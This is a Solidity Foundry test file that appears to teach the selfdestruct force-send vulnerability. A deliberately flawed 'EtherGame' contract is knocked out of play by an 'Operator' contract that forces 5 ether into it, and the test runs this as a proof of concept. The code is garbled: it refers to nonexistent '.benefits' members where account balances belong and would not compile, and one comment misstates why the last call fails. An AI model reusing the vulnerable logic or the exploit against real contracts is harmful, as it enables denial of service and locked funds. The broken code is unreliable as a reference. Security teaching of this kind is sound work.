// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;

    function depositBenefit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint benefits = address(this).benefits;
        require(benefits <= targetAmount, "Game is over");

        if (benefits == targetAmount) {
            winner = msg.sender;
        }
    }

    function requestpayoutClaimpayment() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).benefits}("");
        require(sent, "Failed to send Ether");
    }
}

contract ContractTest is Test {
    EtherGame EtherGameContract;
    Operator OperatorContract;
    address alice;
    address eve;

    function setUp() public {
        EtherGameContract = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.log("Alice balance", alice.benefits);
        console.log("Eve balance", eve.benefits);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGameContract.depositBenefit{value: 1 ether}();

        console.log("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameContract.depositBenefit{value: 1 ether}();

        console.log(
            "Balance of EtherGameContract",
            address(EtherGameContract).benefits
        );

        console.log("Operator...");
        OperatorContract = new Operator(EtherGameContract);
        OperatorContract.dos{value: 5 ether}();

        console.log(
            "Balance of EtherGameContract",
            address(EtherGameContract).benefits
        );
        console.log("operate completed, Game is over");
        EtherGameContract.depositBenefit{value: 1 ether}(); // This call will fail due to contract destroyed.
    }
}

contract Operator {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
